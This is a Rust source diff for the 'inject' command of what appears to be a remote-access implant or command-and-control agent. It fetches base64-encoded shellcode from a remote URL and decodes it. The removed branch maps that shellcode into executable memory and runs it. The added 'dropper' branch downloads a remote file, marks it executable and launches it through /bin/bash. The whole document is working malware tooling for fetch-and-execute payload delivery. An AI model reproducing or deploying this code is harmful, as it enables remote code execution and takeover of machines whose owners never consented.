@@ -1,7 +1,6 @@
 use std::error::Error;
 use crate::logger::Logger;
 use crate::cmd::CommandArgs;
-use memmap2::MmapMut;
 
 use base64::decode as b64_decode;
 #[cfg(windows)] extern crate winapi;
@@ -25,6 +24,7 @@ use base64::decode as b64_decode;
 use reqwest::Client;
 
 async fn decode_shellcode(sc: String, b64_iterations: u32, logger: &Logger) -> Result<Vec<u8>, &str> {
+    logger.debug("Starting shellcode debug".to_string());
     let mut shellcode_vec = Vec::from(sc.trim().as_bytes());
     for i in 0..b64_iterations {
         logger.debug(format!("Decode iteration: {i}"));
@@ -53,13 +53,13 @@ async fn get_shellcode(url: String, b64_iterations: u32, logger: &Logger) -> Res
     let client = Client::new();
     if let Ok(r) = client.get(url).send().await {
         if r.status().is_success() {   
-            logger.info(format!("Got the shellcode")); 
+            logger.info(format!("Downloaded shellcode")); 
             // Get the shellcode. Now we have to decode it
             let shellcode_decoded: Vec<u8>;
-            let shellcode: Vec<u8>;
+            let shellcode_final_vec: Vec<u8>;
             if let Ok(sc) = r.text().await {
                 logger.info(format!("Got encoded bytes"));
-                
+                logger.debug(format!("Encoded shellcode length: {}", sc.len()));
                 match decode_shellcode(sc, b64_iterations, logger).await {
                     Ok(scd) => { shellcode_decoded = scd; },
                     Err(e)  => { return Err(e); }
@@ -81,7 +81,7 @@ async fn get_shellcode(url: String, b64_iterations: u32, logger: &Logger) -> Res
                     // We need to get each one until a proper u8.
                     // Now, keep in mind we only do this for Windows, because we pretty much only make raw byes,
                     // Not '0x' strings for Linux.
-                    shellcode = shellcode_string
+                    shellcode_final_vec = shellcode_string
                         .split(",")
                         .map(|s| s.replace("0x", ""))
                         .map(|s| s.replace(" ", ""))                    
@@ -95,11 +95,11 @@ async fn get_shellcode(url: String, b64_iterations: u32, logger: &Logger) -> Res
                 }
 
                 #[cfg(not(windows))] {
-                    shellcode = shellcode_decoded;
+                    shellcode_final_vec = shellcode_decoded;
                 }
                 
                 // The actual success
-                return Ok(shellcode);
+                return Ok(shellcode_final_vec);
 
             } else {
                 let err_msg = "Could not decode shellcode";
@@ -308,68 +308,62 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
         // Set up our variables; each one could fail on us.
         // Yes this is a lot of verbose error checking, but this
         // has to be rock solid or the agent will die.
-        let mut url: String;
-        let mut b64_iterations: u32;
+        let url: String;
 
         match inject_type.as_str() {
-            "mmap" => {
-                use std::fs::OpenOptions;
-                use std::os::unix::fs::PermissionsExt;
-                use std::mem;
-
+            "dropper" => {
+                // Usage: inject dropper [url] [filename]
                 // Get URL
+                use crate::cmd::download;
+                use std::os::unix::fs::PermissionsExt;
+                let filename: String;
+                use std::process::Command;
+
                 match cmd_args.nth(0) {
                     Some(u) => { 
-                        logger.debug(format!("Shellcode URL: {}", &u));
+                        logger.debug(format!("Shellcode URL: {u}"));
                         url = u; 
                     },
-                    None    => { return Ok("Could not parse URL".to_string()); }
+                    None => { return Ok("Could not parse URL".to_string()); }
                 };
 
-                // Get b64_iterations
+                // Get filename
                 match cmd_args.nth(0) {
-                    Some(bs) => {
-                        if let Ok(b) = bs.parse::<u32>() {
-                            b64_iterations = b;
-                        } else {
-                            return Ok("Could not parse b64 iterations".to_string());
-                        }
+                    Some(f) => { 
+                        logger.debug(format!("Filename: {f}"));
+                        filename = f; 
                     },
-                    None => { return Ok("Could not extract b64 iterations".to_string()); }
+                    None => { return Ok("Could not parse filename".to_string()); }
                 };
-                
-                // Get shellcode
-                let mut shellcode: Vec<u8>; 
-                match get_shellcode(url, b64_iterations, logger).await {
-                    Ok(s) => { shellcode = s},
+
+                let mut download_args = CommandArgs::from_string(
+                    format!("{url} {filename}")
+                );
+                download::handle(&mut download_args, logger).await?;
+                match std::fs::File::open(&filename) {
+                    Ok(f) => {
+                        f.set_permissions(PermissionsExt::from_mode(0o755))?;
+                    },
                     Err(e) => { return Ok(e.to_string()); }
                 };
 
+                let mut cmd_string = String::new();
 
-                let file_name = "blargh";
-                let file = OpenOptions::new()
-                    .read(true)
-                    .write(true)
-                    .create(true)
-                    .open(file_name)?;
-
-                
-                file.set_permissions(PermissionsExt::from_mode(0o755))?;
-                file.set_len(shellcode.len().try_into().unwrap())?;
-
-                let mut mmap = unsafe { MmapMut::map_mut(&file)? };
-                mmap.copy_from_slice(shellcode.as_slice());
-                let exec_map =  mmap.make_exec()?;
-                
-                unsafe {
-                    // copy the shellcode to the memory map
-                    // std::ptr::copy(shellcode.as_ptr(), map.data(), SHELLCODE.len());
-                    let exec_shellcode: extern "C" fn() -> ! = mem::transmute(exec_map.as_ptr());
-                    exec_shellcode();
+                // Basically, if it's not a proper path, add ./
+                if !cmd_string.contains("/") {
+                    cmd_string.push_str("./");
                 }
-                
-                return Ok("Injection completed!".to_string());
-            },
+
+                cmd_string.push_str(filename.as_str());
+
+                // Fire off the command
+                Command::new("/bin/bash")
+                    .arg("-c")
+                    .arg(cmd_string)
+                    .spawn()?;
+
+                Ok("Dropper completed!".to_string())
+            }
             _ => { return Ok("Unknown injection method!".to_string()) ;}
         }
 
